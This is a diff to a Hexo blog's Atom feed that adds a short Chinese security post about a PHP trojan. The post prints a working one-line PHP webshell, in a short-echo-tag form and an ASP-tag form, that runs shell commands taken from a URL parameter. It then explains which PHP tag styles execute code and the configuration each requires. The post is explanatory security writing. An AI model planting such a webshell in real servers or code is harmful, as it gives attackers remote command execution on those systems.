@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://yoursite.com/"/>
-  <updated>2015-12-17T07:28:02.584Z</updated>
+  <updated>2016-01-30T01:42:01.479Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -13,6 +13,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[一个php木马引发的xxoo]]></title>
+    <link href="http://yoursite.com/2016/01/30/%E4%B8%80%E4%B8%AAphp%E6%9C%A8%E9%A9%AC%E5%BC%95%E5%8F%91%E7%9A%84xxoo/"/>
+    <id>http://yoursite.com/2016/01/30/一个php木马引发的xxoo/</id>
+    <published>2016-01-30T01:27:25.000Z</published>
+    <updated>2016-01-30T01:42:01.479Z</updated>
+    <content type="html"><![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
+<h2 id="0x00__u5076_u9047php_u9A6C"><a href="#0x00__u5076_u9047php_u9A6C" class="headerlink" title="0x00 偶遇php马"></a>0x00 偶遇php马</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span>=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br><span class="line">&lt;% <span class="keyword">echo</span> `<span class="variable">$_GET</span>[<span class="number">1</span>]`%&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x01__u53EF_u6267_u884Cphp_u4EE3_u7801_u7684_u6807_u7B7E"><a href="#0x01__u53EF_u6267_u884Cphp_u4EE3_u7801_u7684_u6807_u7B7E" class="headerlink" title="0x01 可执行php代码的标签"></a>0x01 可执行php代码的标签</h2><p>1，&lt;% echo <code>$_GET[1]</code>%&gt;  需要开启asp_tags=On<br> 假如用php3可以通过 short_tags() 函数激活使用短标签 </p>
+<p>2，&lt;? phpinfo()?&gt; 需要在phpini中开启shor_tags()<br>当然也可以用&lt;? phpinfo();  如果你这里不用?&gt;闭合 则需要;<br>另一种则是</p>
+<p>3，</p>
+<p><script language="php"><br>echo phpinfo;<br></script><br>4，<br>&lt;?=<code>$_GET[1]</code>;<br>这里‘=’相当于echo</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
+<h2 id="0x00__u5076_u9047php_u9A6C"><a href="#0x00__u5076_u9047php_u9A6C" class="hea]]>
+    </summary>
+    
+      <category term="php代码安全" scheme="http://yoursite.com/tags/php%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[上传之万恶的zip]]></title>
